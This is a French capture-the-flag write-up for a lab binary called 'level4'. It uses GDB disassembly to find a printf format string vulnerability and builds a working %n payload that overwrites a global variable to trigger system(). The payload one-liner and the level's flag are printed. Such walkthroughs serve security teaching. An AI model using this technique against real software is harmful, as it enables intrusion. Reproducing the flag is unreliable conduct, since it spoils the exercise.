# Level 4

## Étape 1 : Observer le comportement

```bash
./level4
test
test
```
Le programme lit l'input et l'affiche.

```bash
./level4
%x
b7ff26b0
```
Le `%x` est interprété → **Format string vulnerability**.

## Étape 2 : Analyser avec GDB

```bash
gdb ./level4
(gdb) disas main
```
`main()` appelle `n()`.

```bash
(gdb) disas n
```

**Points clés** :
```assembly
0x0804847a <+35>: call   0x8048350 <fgets@plt>    # Lit l'input
0x08048488 <+49>: call   0x8048444 <p>             # Appelle p(buffer)
0x0804848d <+54>: mov    0x8049810,%eax            # Charge m dans eax
0x08048492 <+59>: cmp    $0x1025544,%eax           # Compare m avec 0x1025544
0x08048497 <+64>: jne    0x80484a5                 # Si différent, exit
0x08048499 <+66>: movl   $0x8048590,(%esp)         # Sinon, prépare system()
0x080484a0 <+73>: call   0x8048360 <system@plt>    # Exécute system()
```

**Traduction** :
- Variable `m` à l'adresse `0x8049810`
- Condition : `if (m == 0x1025544)` → `if (m == 16930116)`
- Si vrai → `system()` spawne un shell

```bash
(gdb) disas p
```
```assembly
0x0804844a <+6>:  mov    0x8(%ebp),%eax
0x0804844d <+9>:  mov    %eax,(%esp)
0x08048450 <+12>: call   0x8048340 <printf@plt>
```

**La faille** : `p()` fait `printf(input)` → format string vulnerability.

## Étape 3 : Code C reconstitué

```c
int m;  // Variable globale à 0x8049810

void p(char *str) {
    printf(str);  // faille
}

void n(void) {
    char buffer[512];
    fgets(buffer, 512, stdin);
    p(buffer);
    
    if (m == 16930116) {  // 0x1025544
        system("/bin/cat /home/user/level5/.pass");
    }
}

int main(void) {
    n();
    return 0;
}
```

**Objectif** : Modifier `m` pour qu'elle vaille `16930116`.

## Étape 4 : Trouver la position sur la stack

```bash
./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141
```

`41414141` = "AAAA" en hexadécimal → **Position 12**.

## Étape 5 : Construire le payload

**Formule** :
```
[ADRESSE_CIBLE] + [PADDING] + [%n]
```

**Calculs** :
- Adresse de `m` : `0x8049810` → little-endian : `\x10\x98\x04\x08`
- Valeur à écrire : `16930116`
- Déjà affiché : `4` bytes (l'adresse)
- Padding nécessaire : `16930116 - 4 = 16930112`
- Position : `12`

**Payload** :
```python
python -c "print('\x10\x98\x04\x08' + '%16930112u' + '%12\$n')"
```

**Décomposition** :
1. `\x10\x98\x04\x08` → adresse de `m` (4 bytes)
2. `%16930112u` → affiche 16930112 caractères (padding)
3. `%12$n` → écrit le total (16930116) à l'adresse en position 12

**Comment %n fonctionne** :
1. `printf` affiche 16930116 caractères au total
2. `printf` voit `%12$n`
3. `printf` va en position 12 de la stack
4. `printf` trouve : `0x08049810`
5. `printf` écrit `16930116` à l'adresse `0x08049810`

## Étape 6 : Exploitation

```bash
(python -c "print('\x10\x98\x04\x08' + '%16930112u' + '%12\$n')"; cat) | ./level4
```

Le `;cat` garde stdin ouvert pour le shell.

**Résultat** :

**Flag** : `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`

